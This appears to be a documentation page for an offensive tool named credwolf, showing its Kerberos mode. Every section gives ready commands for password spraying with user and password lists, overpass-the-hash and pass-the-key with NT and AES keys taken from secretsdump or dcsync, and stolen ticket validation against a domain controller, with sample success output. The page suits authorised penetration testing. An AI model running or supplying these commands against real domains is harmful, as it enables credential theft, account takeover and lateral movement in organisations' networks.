# Kerberos

Test credentials via Kerberos pre-authentication. See the [CLI reference](../reference/cli.md) for all flags, [error handling](../reference/error-handling.md) for Kerberos error codes, and [Kerberos flow](../internals/kerberos-flow.md) for how requests map to login attempts.

## Passwords

```bash
# Single user + single password (RC4 encryption, UDP transport)
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -u Administrator -p 'Password1!'

# Password with AES256 or AES128 encryption
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -u Administrator -p 'Password1!' -e aes256
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -u Administrator -p 'Password1!' -e aes128

# User list + password list
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -U users.txt -P passwords.txt
```

## Inline keys

```bash
# Overpass-the-hash: use NT hash as RC4 key
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -u Administrator --rc4-key 7facdc498ed1680c4fd1448319a8c04f --transport tcp
# [+] evil.corp/Administrator:7facdc498ed1680c4fd1448319a8c04f@rc4_key

# Pass-the-key with AES256 (from secretsdump/dcsync aes256-cts-hmac-sha1-96 field)
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -u Administrator --aes256-key 9b12da6a4bdc263c1ac8f6302dc071e6e84321a263fa48784534b1ae43db2925 --transport tcp
# [+] evil.corp/Administrator:9b12da6a4bdc263c1ac8f6302dc071e6e84321a263fa48784534b1ae43db2925@aes256_key

# Pass-the-key with AES128 (from secretsdump/dcsync aes128-cts-hmac-sha1-96 field)
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -u Administrator --aes128-key 4bbb66ffd90a18f248b909016eb4b75f --transport tcp
# [+] evil.corp/Administrator:4bbb66ffd90a18f248b909016eb4b75f@aes128_key

# Combine multiple inline keys (all tested per user)
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -u Administrator --rc4-key 7facdc498ed1680c4fd1448319a8c04f --aes256-key 9b12da6a4bdc263c1ac8f6302dc071e6e84321a263fa48784534b1ae43db2925 --transport tcp
# [+] evil.corp/Administrator:7facdc498ed1680c4fd1448319a8c04f@rc4_key
# [+] evil.corp/Administrator:9b12da6a4bdc263c1ac8f6302dc071e6e84321a263fa48784534b1ae43db2925@aes256_key
```

## Key files

```bash
# User list + key file
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -U users.txt --rc4-file rc4_keys.txt --transport tcp
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -U users.txt --aes128-file aes128_keys.txt --transport tcp
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -U users.txt --aes256-file aes256_keys.txt --transport tcp

# Multiple key files combined (keys pooled, tested per user)
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -U users.txt --rc4-file rc4.txt --aes128-file aes128.txt --aes256-file aes256.txt --transport tcp
```

## Paired key files

```bash
# Pre-paired user:key file (auto-detects RC4 vs AES256 by key length)
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 --user-key-file pairs.txt --transport tcp

# user:key file with AES128 disambiguation (treats 32-hex keys as AES128)
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 --user-key-file pairs.txt -e aes128 --transport tcp
```

## Ticket files

```bash
# Validate a ticket (auto-detects ccache vs kirbi format)
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -u Administrator --ticket admin.ccache
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -u Administrator --ticket admin.kirbi
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -U users.txt --ticket krb5.ccache
```

## TCP transport

```bash
# Use TCP transport (required when KDC returns KRB_ERR_RESPONSE_TOO_BIG)
credwolf -d evil.corp kerberos --kdc-ip 10.0.0.1 -U users.txt -P passwords.txt --transport tcp
```
